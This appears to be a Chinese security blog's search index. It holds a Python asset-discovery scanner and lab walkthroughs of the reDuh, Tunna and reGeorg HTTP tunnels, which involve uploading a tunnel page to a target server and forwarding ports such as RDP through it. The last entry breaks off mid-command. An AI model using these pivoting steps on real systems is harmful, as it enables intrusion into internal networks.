<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python 资产发现小脚本</title>
      <link href="/article/tool-url-survival.html"/>
      <url>/article/tool-url-survival.html</url>
      
        <content type="html"><![CDATA[<p>脚本会将URL分割，仅适用于资产发现探测，不适用链接存活检测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#WEB探测专用，不适用于存活探测</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetUrl</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(GetUrl, self).__init__()</span><br><span class="line">        self.headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">geturl</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, verify=<span class="literal">False</span>, headers=self.headers, allow_redirects=<span class="literal">False</span>,timeout = <span class="number">15</span>)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">301</span> <span class="keyword">or</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">                self.host = urlparse(url)</span><br><span class="line">                self.scheme = self.host.scheme</span><br><span class="line">                self.netloc = self.host.netloc</span><br><span class="line">                location = response.headers[<span class="string">'Location'</span>]</span><br><span class="line">                <span class="keyword">if</span> self.netloc.split(<span class="string">':'</span>)[<span class="number">0</span>] <span class="keyword">in</span> location <span class="keyword">or</span> location[<span class="number">0</span>:<span class="number">4</span>].lower() == <span class="string">'http'</span>:</span><br><span class="line">                    get_url = location</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> location[<span class="number">0</span>] != <span class="string">'/'</span> <span class="keyword">or</span> location[<span class="number">0</span>:<span class="number">4</span>].lower() != <span class="string">'http'</span>:</span><br><span class="line">                        get_url = <span class="string">'&#123;&#125;://&#123;&#125;/&#123;&#125;'</span>.format(self.scheme,self.netloc,location)</span><br><span class="line">                response = requests.get(get_url, verify=<span class="literal">False</span>, headers=self.headers, allow_redirects=<span class="literal">False</span>,timeout = <span class="number">15</span>)</span><br><span class="line">                get_url = response.url</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                get_url = response.url</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> [get_url,response.text,response.status_code]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waittask</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.telnet = telnetlib.Telnet()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> asset.qsize() &lt; <span class="number">500</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">                    host = urlparse(waittask.get())</span><br><span class="line">                    self.scheme = host.scheme</span><br><span class="line">                    self.netloc = host.netloc</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span> self.netloc:</span><br><span class="line">                            Host = self.netloc.split(<span class="string">':'</span>)</span><br><span class="line">                            self.telnet.open(Host[<span class="number">0</span>],Host[<span class="number">1</span>],timeout = <span class="number">3</span>)</span><br><span class="line">                            asset.put(<span class="string">'&#123;&#125;://&#123;&#125;:&#123;&#125;'</span>.format(self.scheme,Host[<span class="number">0</span>],Host[<span class="number">1</span>]))</span><br><span class="line">                        <span class="keyword">elif</span> self.scheme == <span class="string">'https'</span>:</span><br><span class="line">                            self.telnet.open(self.netloc,<span class="number">443</span>,timeout = <span class="number">3</span>)</span><br><span class="line">                            asset.put(<span class="string">'&#123;&#125;://&#123;&#125;'</span>.format(self.scheme,self.netloc))</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.telnet.open(self.netloc,<span class="number">80</span>,timeout = <span class="number">3</span>)</span><br><span class="line">                            asset.put(<span class="string">'&#123;&#125;://&#123;&#125;'</span>.format(self.scheme,self.netloc))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Asset</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> asset.empty():</span><br><span class="line">                url = asset.get()</span><br><span class="line">                <span class="comment"># return [get_url,response.text,response.status_code]</span></span><br><span class="line">                info = GetUrl().geturl(url)</span><br><span class="line">                self.get_url = info[<span class="number">0</span>]</span><br><span class="line">                self.content = info[<span class="number">1</span>]</span><br><span class="line">                self.status_code = info[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">if</span> self.status_code == <span class="number">301</span> <span class="keyword">or</span> self.status_code == <span class="number">302</span>:</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        info = GetUrl().geturl(self.get_url)</span><br><span class="line">                        <span class="keyword">if</span> info:</span><br><span class="line">                            <span class="keyword">if</span> info[<span class="number">2</span>] != <span class="number">301</span> <span class="keyword">or</span> info[<span class="number">2</span>] != <span class="number">302</span>:</span><br><span class="line">                                self.get_url = info[<span class="number">0</span>]</span><br><span class="line">                                self.content = info[<span class="number">1</span>]</span><br><span class="line">                                self.status_code = info[<span class="number">2</span>]</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.get_url = info[<span class="number">0</span>]</span><br><span class="line">                    self.url_title = get_title(self.content)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.url_title = get_title(self.content)</span><br><span class="line"></span><br><span class="line">                print(self.status_code,self.get_url,self.url_title)</span><br><span class="line">                get.put([url,self.status_code,self.get_url,self.url_title])</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">            print(<span class="string">'进度：&#123;:.2%&#125; 当前还有&#123;&#125;个端口开放检测，&#123;&#125;个WEB探测任务未完成！'</span>.format(<span class="number">1</span>-waittask.qsize()/sums,waittask.qsize(),asset.qsize()))</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> get.empty():</span><br><span class="line">                assets = get.get()</span><br><span class="line">                <span class="keyword">with</span> open(<span class="string">'survival.txt'</span>,<span class="string">'a'</span>,encoding=<span class="string">'gb18030'</span>) <span class="keyword">as</span> cent:</span><br><span class="line">                    cent.write(<span class="string">'&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;\n'</span>.format(assets[<span class="number">0</span>],assets[<span class="number">1</span>],assets[<span class="number">2</span>],assets[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_title</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        title = re.findall(<span class="string">'&lt;title&gt;(.*?)&lt;/title&gt;'</span>,text.encode(<span class="string">'iso-8859-1'</span>).decode(<span class="string">'utf-8'</span>).lower())[<span class="number">0</span>].strip()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            title = re.findall(<span class="string">'&lt;title&gt;(.*?)&lt;/title&gt;'</span>,text.encode(<span class="string">'iso-8859-1'</span>).decode(<span class="string">'gbk'</span>).lower())[<span class="number">0</span>].strip()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                title = re.findall(<span class="string">'&lt;title&gt;(.*?)&lt;/title&gt;'</span>,text.lower())[<span class="number">0</span>].strip()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                title = <span class="string">'获取标题失败'</span></span><br><span class="line">    <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    waittask = queue.Queue()</span><br><span class="line">    asset = queue.Queue()</span><br><span class="line">    get = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(file) <span class="keyword">as</span> content:</span><br><span class="line">        <span class="keyword">for</span> cent <span class="keyword">in</span> content:</span><br><span class="line">            waittask.put(cent.strip())</span><br><span class="line">    sums = int(waittask.qsize())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        Waittask_ = Waittask()</span><br><span class="line">        Waittask_.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        Asset_ = Asset()</span><br><span class="line">        Asset_.start()</span><br><span class="line"></span><br><span class="line">    check = Check()</span><br><span class="line">    check.start()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 原创工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>100、HTTP隧道reDuh第四季</title>
      <link href="/article/100_HTTP%E9%9A%A7%E9%81%93reDuh%E7%AC%AC%E5%9B%9B%E5%AD%A3.html"/>
      <url>/article/100_HTTP%E9%9A%A7%E9%81%93reDuh%E7%AC%AC%E5%9B%9B%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>reDuh简介：</strong></p><p>reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p>BlackHat USA 2008介绍：<br><a href="https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-" target="_blank" rel="noopener">https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-</a></p><p>Github：<br><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">https://github.com/sensepost/reDuh</a></p><p><strong>攻击机：</strong><br>192.168.1.5 Debian<br>192.168.1.4 Windows 7</p><p><strong>靶机：</strong><br>192.168.1.119 Windows 2003</p><p><strong>安装：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# git clone https://github.com/sensepost/reDuh.git</span><br><span class="line">Cloning into &apos;reDuh&apos;...</span><br><span class="line">remote: Enumerating objects: 47, done.</span><br><span class="line">remote: Total 47 (delta 0), reused 0 (delta 0), pack‐reused 47</span><br><span class="line">Unpacking objects: 100% (47/47), done.</span><br><span class="line">root@John:~# cd reDuh/</span><br><span class="line">root@John:~/reDuh# ls</span><br><span class="line">README.markdown reDuhClient reDuhServers</span><br></pre></td></tr></table></figure><p><img src="../do/media/1baa9c1874d47e57ff19724c1e050dd8.jpg" alt></p><p><strong>靶机执行：</strong><br>以aspx为demo。</p><p><img src="../do/media/853cde273f8ee0873156e9c624258201.jpg" alt></p><p><strong>攻击机执行：</strong><br>绑定端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/reDuh/reDuhClient/dist# java ‐jar reDuhClient.jar http://192.168.1.119/reDuh.aspx</span><br><span class="line">[Info]Querying remote web page for usable remote service port</span><br><span class="line">[Info]Remote RPC port chosen as 42000</span><br><span class="line">[Info]Attempting to start reDuh from 192.168.1.119:80/reDuh.aspx. Using service port 42000. Please wait...</span><br><span class="line">[Info]reDuhClient service listener started on local port 1010</span><br></pre></td></tr></table></figure><p><img src="../do/media/2596f6edba3d76db9a416b2011e8fb9b.jpg" alt></p><p>开启新terminal，建立隧道<br>命令如下：<br>[createTunnel][本地绑定端口]:  127.0.0.1:[远程端口]  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# telnet 127.0.0.1 1010</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">Welcome to the reDuh command line</span><br><span class="line">&gt;&gt;[createTunnel]30080:127.0.0.1:80</span><br><span class="line">Successfully bound locally to port 30080. Awaiting connections.</span><br></pre></td></tr></table></figure><p><img src="../do/media/9a14208cab4886588559a38d694a5cf1.jpg" alt></p><p>攻击机端口前后对比：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# netstat ‐ntlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me</span><br><span class="line">tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau</span><br><span class="line">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd</span><br><span class="line">tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau</span><br><span class="line">tcp6 0 0 :::22 :::* LISTEN 674/sshd</span><br><span class="line">root@John:~# netstat ‐ntlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me</span><br><span class="line">tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau</span><br><span class="line">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd</span><br><span class="line">tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau</span><br><span class="line">tcp6 0 0 :::1010 :::* LISTEN 6102/java</span><br><span class="line">tcp6 0 0 :::22 :::* LISTEN 674/sshd</span><br><span class="line">tcp6 0 0 :::30080 :::\* LISTEN 6102/java</span><br></pre></td></tr></table></figure><p><img src="../do/media/525c8fec46511f49176e20b50a017226.jpg" alt></p><p>访问攻击机30080端口，既等价于访问靶机80端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# curl http://192.168.1.5:30080/</span><br><span class="line">&lt;html&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta HTTP‐EQUIV=&quot;Content‐Type&quot; Content=&quot;text/html; charset=gb2312&quot;&gt; </span><br><span class="line"></span><br><span class="line">&lt;title ID=titletext&gt;建设中&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=white&gt; </span><br><span class="line"></span><br><span class="line">... </span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/4594e609d339d06fe44ecf11a575c966.jpg" alt></p><p>遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>99、HTTP隧道Tunna第三季</title>
      <link href="/article/99_HTTP%E9%9A%A7%E9%81%93Tunna%E7%AC%AC%E4%B8%89%E5%AD%A3.html"/>
      <url>/article/99_HTTP%E9%9A%A7%E9%81%93Tunna%E7%AC%AC%E4%B8%89%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>Tunna简介：</strong></p><p>Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。</p><p>Tunna演示稿：<br><a href="https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE" target="_blank" rel="noopener">https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE</a></p><p>Github：<br><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p><p><strong>攻击机：</strong><br>192.168.1.5 Debian<br>192.168.1.4 Windows 7</p><p><strong>靶机：</strong><br>192.168.1.119 Windows 2003</p><p><strong>安装：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# git clone https://github.com/SECFORCE/Tunna.git</span><br><span class="line">Cloning into &apos;Tunna&apos;...</span><br><span class="line">remote: Enumerating objects: 6, done.</span><br><span class="line">remote: Counting objects: 100% (6/6), done.</span><br><span class="line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="line">remote: Total 156 (delta 0), reused 2 (delta 0), pack‐reused 150</span><br><span class="line">Receiving objects: 100% (156/156), 8.93 MiB | 25.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (84/84), done.</span><br></pre></td></tr></table></figure><p><img src="../do/media/dac94b993935a569d6b5cec53e91eb54.jpg" alt></p><p><strong>靶机执行：</strong></p><p>以aspx为demo。  </p><p><img src="../do/media/45105406fce5e573635d20030393a928.jpg" alt></p><p><strong>攻击机执行：</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py ‐u http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.119</span>/conn.aspx ‐l <span class="number">1234</span> ‐r <span class="number">3389</span> ‐s ‐ v</span><br></pre></td></tr></table></figure><p><img src="../do/media/270e3220479652ae6eb658f40156cf97.jpg" alt></p><p><img src="../do/media/5e8e8a0ea358fdf98fc37bbb31b5994e.jpg" alt></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p><strong>解决：</strong>General Exception: [Errno 104] Connection reset by peer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Spawning keep‐alive thread</span><br><span class="line">[‐] Keep‐alive thread not required</span><br><span class="line">[+] Checking for proxy: False</span><br></pre></td></tr></table></figure><p>连接后，出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">General Exception: [Errno 104] Connection reset by peer</span><br></pre></td></tr></table></figure><p>等待出现：<strong>无法验证此远程计算机的身份，是否仍要连接？</strong></p><p>再次运行，在点击是(Y)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py ‐u http://192.168.1.119/conn.aspx ‐l 1234 ‐r 3389 ‐s ‐ v</span><br></pre></td></tr></table></figure><p><img src="../do/media/086a4ba0d1640a1d5b5efb747490329d.jpg" alt></p><p><img src="../do/media/1a7fb8afe7862e95f22ce331e1ea6480.jpg" alt></p><p><img src="../do/media/89343acc07c18c27399943cd200091b6.jpg" alt></p><p><strong>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</strong></p><p>注册表键值：<br>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers<br>删除对应IP键值即可。</p><p>非常遗憾的是，Tunna对PHP的支持并不是太友好。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>98、HTTP隧道reGeorg第二季</title>
      <link href="/article/98_HTTP%E9%9A%A7%E9%81%93reGeorg%E7%AC%AC%E4%BA%8C%E5%AD%A3.html"/>
      <url>/article/98_HTTP%E9%9A%A7%E9%81%93reGeorg%E7%AC%AC%E4%BA%8C%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="reGeorg简介："><a href="#reGeorg简介：" class="headerlink" title="reGeorg简介："></a>reGeorg简介：</h3><p>reGeorg 的前身是2008年 SensePost 在 BlackHat USA 2008 的 reDuh 延伸与扩展。也是目前安全从业人员使用最多，范围最广，支持多丰富的一款 http 隧道。从本质上讲，可以将 JSP/PHP/ASP/ASPX 等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p>2014年blackhat介绍<br><a href="https://www.blackhat.com/eu-14/arsenal.html#regeorg" target="_blank" rel="noopener">https://www.blackhat.com/eu-14/arsenal.html#regeorg</a></p><p>Github：<br><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p><p><strong>攻击机：</strong><br>192.168.1.5 Debian<br>192.168.1.4 Windows 7</p><p><strong>靶机：</strong><br>192.168.1.119 Windows 2003</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# git clone https://github.com/sensepost/reGeorg.git</span><br><span class="line">Cloning into &apos;reGeorg&apos;...</span><br><span class="line">remote: Enumerating objects: 85, done.</span><br><span class="line">remote: Total 85 (delta 0), reused 0 (delta 0), pack‐reused 85</span><br><span class="line">Unpacking objects: 100% (85/85), done.</span><br><span class="line">root@John:~# cd reGeorg/</span><br><span class="line">root@John:~reGeorg# ls</span><br><span class="line">LICENSE.html LICENSE.txt README.md reGeorgSocksProxy.py tunnel.ashx tu</span><br><span class="line">nnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp</span><br><span class="line">root@John:~/reGeorg# python reGeorgSocksProxy.py ‐h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_____</span><br><span class="line">_____ ______ __|___ |__ ______ _____ _____ ______</span><br><span class="line">| | | ___|| ___| || ___|/ \| | | ___|</span><br><span class="line">| \ | ___|| | | || ___|| || \ | | |</span><br><span class="line">|__|\__\|______||______| __||______|\_____/|__|\__\|______|</span><br><span class="line">|_____|</span><br><span class="line">... every office needs a tool like Georg </span><br><span class="line"></span><br><span class="line">willem@sensepost.com / @_w_m__</span><br><span class="line">sam@sensepost.com / @trowalts</span><br><span class="line">etienne@sensepost.com / @kamp_staaldraad </span><br><span class="line"></span><br><span class="line">usage: reGeorgSocksProxy.py [‐h] [‐l] [‐p] [‐r] ‐u [‐v] </span><br><span class="line"></span><br><span class="line">Socks server for reGeorg HTTP(s) tunneller </span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">‐h, ‐‐help show this help message and exit</span><br><span class="line">‐l , ‐‐listen‐on The default listening address</span><br><span class="line">‐p , ‐‐listen‐port The default listening port</span><br><span class="line">‐r , ‐‐read‐buff Local read buffer, max data to be sent per POST</span><br><span class="line">‐u , ‐‐url The url containing the tunnel script</span><br><span class="line">‐v , ‐‐verbose Verbose output[INFO\|DEBUG]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/reGeorg# pip install urllib3</span><br><span class="line">Requirement already satisfied: urllib3 in /usr/lib/python2.7/dist‐packages (1.24)</span><br></pre></td></tr></table></figure><p><img src="../do/media/c0a4051103d17e54b53982c1b6e8b631.jpg" alt></p><p><strong>靶机执行：</strong></p><p>以aspx为demo。  </p><p><img src="../do/media/6f441fb77ba89a092b149fc8b4bc7eb9.jpg" alt></p><p><strong>攻击机执行：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 